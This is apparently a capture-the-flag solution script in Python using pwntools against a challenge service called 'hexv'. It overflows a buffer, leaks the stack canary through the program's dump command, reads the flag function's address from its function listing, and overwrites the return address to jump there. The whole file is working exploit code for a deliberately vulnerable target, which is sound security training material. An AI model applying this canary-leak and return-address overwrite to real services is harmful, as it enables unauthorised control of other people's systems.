#!/usr/bin/env python3
from pwn import *

io = remote("hexv.challs.pwnoh.io", 1337, ssl=True)

io.sendlineafter(b">> ", b"A"*(58+58+4))
io.sendlineafter(b">> ", b"dump")

for i in range(10): io.recvline()
canary = io.recvline().strip().replace(b"\x1b[33m", b"").replace(b"\x1b[0m", b"").split(b"41 41 41 41  41 41 41 41  ")[1].replace(b"\x1b[31m", b"").replace(b" ", b"")[:16].decode()

io.sendlineafter(b">> ", b"funcs")
for i in range(5): io.recvline()

flag_func = io.recvline().strip().replace(b"\x1b[0m\x1b[1m", b"").decode().split(" ")[0][2:]
io.sendlineafter(b">> ", b"A"*(58+58+4) + bytes.fromhex(canary) + p64(0x0) + p64(int(flag_func, 16)))
io.sendlineafter(b">> ", b"quit")
io.interactive()
